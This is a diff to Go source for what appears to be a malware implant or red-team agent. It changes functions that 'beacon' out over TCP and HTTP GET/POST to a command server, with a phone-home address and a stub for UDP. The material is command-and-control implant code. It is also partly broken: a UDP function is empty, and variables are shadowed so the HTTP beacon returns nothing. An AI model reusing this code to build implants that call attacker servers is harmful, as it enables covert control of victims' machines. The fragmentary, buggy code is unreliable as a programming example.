@@ -27,7 +27,7 @@ import (
 // command_tcpaddr is an ip:port as string for TCP connections
 // if a "good password *HINT*" is provided
 // has a return code to process: 0 means an error, 1 means success
-func BaconTCP(command_tcpaddr net.TCPAddr) (return_code int, derp error) {
+func BaconTCP(command_tcpaddr net.TCPAddr) (herp *net.TCPConn, derp error) {
 	// OLD: Have to cast the string to a net.IP type
 	//Core.PHONEHOME_TCP.IP = net.IP(command_tcpaddr)
 
@@ -57,13 +57,13 @@ func BaconTCP(command_tcpaddr net.TCPAddr) (return_code int, derp error) {
 		if derp != nil {
 			// print the error
 			ErrorHandling.Error_printer(derp, "[-] Error: TCP Beacon Connection Failed")
-			return 0, derp // error code : potato
+			return connection, derp // error code : potato
 		}
 		json_from_command, derp := json.Marshal(netData)
 		if derp != nil {
 			// print the error
 			ErrorHandling.Error_printer(derp, "[-] Error: TCP Beacon Connection Failed")
-			return 0, derp
+			return connection, derp
 		}
 		beacon_reply := Core.BeaconResponse{
 			Authstring: string(json_from_command),
@@ -76,7 +76,8 @@ func BaconTCP(command_tcpaddr net.TCPAddr) (return_code int, derp error) {
 }
 
 // Same for UDP
-func BeaconUDP() {
+func BeaconUDP(command_tcpaddr net.UDPAddr) (return_code int, derp error) {
+	return
 }
 
 // we are going to make different HTTP requests to the Command Server
@@ -95,10 +96,36 @@ HTTP Methods of beaconing out
 /*/
 
 // function to call other functions
-func BeaconHTTP(command_http string) return_code int , derp error {
-	
-
+// I this because it's easy to undo, and it may prove
+// useful in creation of the builder scripts
+func BeaconHTTP(command_http string, method string) (herp *http.Response, derp error) {
+	// switch method {
+	if method == "get" {
+		//case "get":
+		http_response, derp := BeaconHTTPGet(command_http)
+		if derp != nil {
+			ErrorHandling.Error_printer(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
+			return http_response, derp
+		}
+	} else if method == "post" {
+		//case "post":
+		http_response, derp := BeaconHTTPPost(command_http)
+		if derp != nil {
+			ErrorHandling.Error_printer(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
+			return http_response, derp
+		}
+	} else {
+		//default:
+		http_response, derp := BeaconHTTPPost(command_http)
+		if derp != nil {
+			ErrorHandling.Error_printer(derp, "[-] Beacon GET failed to connect to command, stopping beacon")
+			return http_response, derp
+		}
+	}
+	// apparently this is "naked"... o_O
+	return
 }
+
 func BeaconHTTPGet(command_url string) (*http.Response, error) {
 	http_response, derp := http.Get(command_url)
 	if derp != nil {
